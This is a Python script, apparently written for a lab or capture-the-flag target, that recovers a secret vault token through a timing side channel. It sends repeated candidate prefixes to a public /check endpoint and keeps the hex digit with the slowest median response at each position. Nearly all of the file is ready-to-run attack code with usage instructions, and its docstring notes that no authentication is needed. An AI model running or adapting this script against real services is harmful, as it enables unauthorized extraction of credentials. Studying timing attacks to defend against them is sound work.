"""Timing-side-channel extraction of the vault token from public HTTP.

The target's `check(candidate, SECRET)` does no early return on mismatch, but
spends ~1.5 ms of CPU per *matching* prefix byte. The total response time for
a candidate increases with how many of its leading bytes match the real
SECRET. We probe each position with all 16 hex digits and the longest median
RTT wins.

Usage:
  python3 attack.py https://<cvm>/<project>/ <length>

Doesn't need any auth, doesn't read source — just observes public HTTP.
"""
import statistics
import sys
import time
import urllib.parse
import urllib.request
import string

SAMPLES = 10
ALPHABET = string.hexdigits.lower()  # try lowercase hex; expand if needed


def time_request(base_url: str, candidate: str) -> float:
    url = base_url.rstrip("/") + "/check?t=" + urllib.parse.quote(candidate)
    t0 = time.perf_counter()
    with urllib.request.urlopen(url, timeout=5) as r:
        r.read()
    return time.perf_counter() - t0


def median_for(base_url: str, candidate: str, n: int) -> float:
    samples = []
    for _ in range(n):
        try:
            samples.append(time_request(base_url, candidate))
        except Exception:
            pass
    return statistics.median(samples) if samples else float("inf")


def extract(base_url: str, length: int) -> str:
    known = ""
    pad = "0" * (length - 1)
    for pos in range(length):
        scores = []
        for ch in ALPHABET:
            cand = known + ch + pad[: length - pos - 1]
            t = median_for(base_url, cand, SAMPLES)
            scores.append((t, ch))
        scores.sort(reverse=True)
        best_t, best_ch = scores[0]
        runner_t, _ = scores[1]
        gap_ms = (best_t - runner_t) * 1000
        known += best_ch
        print(f"  pos {pos:2d}: {best_ch!r}  (best={best_t*1000:.1f}ms  "
              f"runner-up={runner_t*1000:.1f}ms  gap={gap_ms:.2f}ms)  "
              f"so far: {known!r}")
    return known


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("usage: attack.py <base_url> [length]", file=sys.stderr)
        sys.exit(1)
    base = sys.argv[1]
    length = int(sys.argv[2]) if len(sys.argv) > 2 else 12
    print(f"target: {base}  length: {length}  samples/byte: {SAMPLES}")
    print("extracting...")
    t0 = time.time()
    found = extract(base, length)
    print(f"\nrecovered: {found!r}  in {time.time()-t0:.1f}s")
